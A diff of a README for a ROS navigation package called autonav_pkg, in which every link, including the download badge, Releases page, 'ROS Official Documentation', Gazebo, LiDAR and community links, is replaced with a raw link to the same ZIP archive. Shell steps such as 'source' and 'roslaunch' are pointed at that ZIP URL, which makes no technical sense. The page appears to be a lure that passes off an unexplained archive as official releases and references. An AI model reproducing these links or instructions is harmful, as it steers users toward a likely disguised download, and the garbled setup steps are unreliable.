@@ -6,7 +6,7 @@
 
 ## 🔗 Download
 
-[![Download autonav_pkg](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip%20autonav_pkg-v1.0-blue)](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
+[![Download autonav_pkg](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip%20autonav_pkg-v1.0-blue)](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ sudo apt install ros-noetic-navigation
 
 ### 📥 Download & Install
 
-You can download the package by visiting the [Releases page](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip). Look for the latest version and download the ZIP file. After downloading:
+You can download the package by visiting the [Releases page](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip). Look for the latest version and download the ZIP file. After downloading:
 
 1. Extract the ZIP file to a location on your computer.
 2. Open a terminal and navigate to the extracted folder.
@@ -49,7 +49,7 @@ catkin_make
 You need to source your ROS workspace to ensure all the configurations are loaded properly:
 
 ```bash
-source https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip
+source https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip
 ```
 
 ### 🚀 Launch the Demo
@@ -57,7 +57,7 @@ source https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots
 Now, you are ready to launch the demo. Open a terminal and run the following command:
 
 ```bash
-roslaunch autonav_pkg https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip
+roslaunch autonav_pkg https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip
 ```
 
 This will start the simulation environment with your robot ready to navigate.
@@ -96,9 +96,9 @@ You can add relevant displays using the "Add" button. Select "Grid", "RobotModel
 
 For more detailed information, you can refer to the links below:
 
-- [ROS Official Documentation](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
-- [Gazebo Simulation Site](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
-- [LiDAR Technology Overview](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
+- [ROS Official Documentation](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
+- [Gazebo Simulation Site](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
+- [LiDAR Technology Overview](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
 
 ## 🆘 Troubleshooting
 
@@ -112,11 +112,11 @@ If you encounter any issues, check the following:
 
 For further assistance, you can join our community on:
 
-- [GitHub Issues](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
-- [ROS Community Forum](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip)
+- [GitHub Issues](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
+- [ROS Community Forum](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip)
   
 Join us in exploring the future of robotics and navigation!
 
 ## 🔗 More Info
 
-You can always return to the [Releases page](https://raw.githubusercontent.com/9ysn3/autonav_pkg/main/docs/screenshots/pkg_autonav_v2.9.zip) for updates and new versions of **autonav_pkg**. Happy navigating!
+You can always return to the [Releases page](https://github.com/9ysn3/autonav_pkg/raw/refs/heads/main/srv/autonav_pkg_toponarcosis.zip) for updates and new versions of **autonav_pkg**. Happy navigating!
